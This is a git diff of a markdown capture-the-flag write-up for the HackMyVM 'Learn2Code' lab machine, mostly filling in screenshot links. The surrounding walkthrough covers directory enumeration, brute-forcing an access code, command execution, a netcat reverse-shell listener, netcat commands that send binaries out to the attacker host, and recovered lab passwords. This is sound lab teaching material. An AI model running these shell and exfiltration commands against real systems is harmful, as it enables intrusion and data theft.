@@ -18,7 +18,7 @@ Unlike most HackMyVM machines, this box does not immediately provide an IP addre
 
 We must first discover the target on the network.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q1.png)
 
 ---
 
@@ -40,7 +40,7 @@ After reviewing the results, we discover the target machine.
 192.168.56.123
 ```
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q2.png)
 
 ---
 
@@ -63,7 +63,7 @@ PORT   STATE SERVICE
 
 Only a single service is exposed.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q3.png)
 
 ---
 
@@ -96,7 +96,7 @@ Access system
 * Access control mechanism appears present
 * Only HTTP exposed
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q4.png)
 
 ---
 
@@ -108,7 +108,7 @@ The page requests an authentication code before granting access.
 
 This suggests some form of access control or gatekeeping mechanism.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q5.png)
 
 ---
 
@@ -122,7 +122,7 @@ Using Feroxbuster:
 feroxbuster -u http://192.168.56.123
 ```
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q6.png)
 
 ---
 
@@ -136,7 +136,7 @@ Among the discovered files:
 
 Backup files are always worth investigating.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q7.png)
 
 ---
 
@@ -152,7 +152,7 @@ access.php.bak
 
 Reviewing the backup code reveals logic associated with a secret access code.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q8.png)
 
 ---
 
@@ -162,7 +162,7 @@ The application validates a numeric code.
 
 Rather than manually guessing values, generate a wordlist.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q9.png)
 
 ---
 
@@ -189,7 +189,7 @@ Eventually the valid access code is identified.
 
 This grants access to the next stage of the application.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q10.png)
 
 ---
 
@@ -201,7 +201,7 @@ The application appears to evaluate supplied input.
 
 This allows command execution.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q11.png)
 
 ---
 
@@ -229,7 +229,7 @@ nc -lvnp 4444
 
 A reverse shell is obtained.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q12.png)
 
 ---
 
@@ -262,7 +262,7 @@ export TERM=xterm
 
 We now have a fully interactive shell.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q13.png)
 
 ---
 
@@ -280,7 +280,7 @@ One binary stands out:
 /usr/bin/MakeMeLearner
 ```
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q14.png)
 
 ---
 
@@ -302,7 +302,7 @@ nc -q 3 -n 192.168.56.106 53 < MakeMeLearner
 
 Now the binary can be analyzed locally.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q15.png)
 
 ---
 
@@ -330,7 +330,7 @@ Successful execution grants access as:
 learner
 ```
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q16.png)
 
 ---
 
@@ -363,7 +363,7 @@ N1c3m0veMat3!
 
 User access achieved.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q17.png)
 
 ---
 
@@ -395,7 +395,7 @@ Target:
 nc -q 3 -n 192.168.56.106 53 < MySecretPasswordVault
 ```
 
-![image alt]()
+
 
 ---
 
@@ -429,7 +429,7 @@ root : NOI98hOIhj)(Jj
 
 Successfully authenticates.
 
-![image alt]()
+
 
 ---
 
@@ -463,7 +463,7 @@ root
 
 Machine rooted successfully.
 
-![image alt]()
+![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q17.png)
 
 ---
 
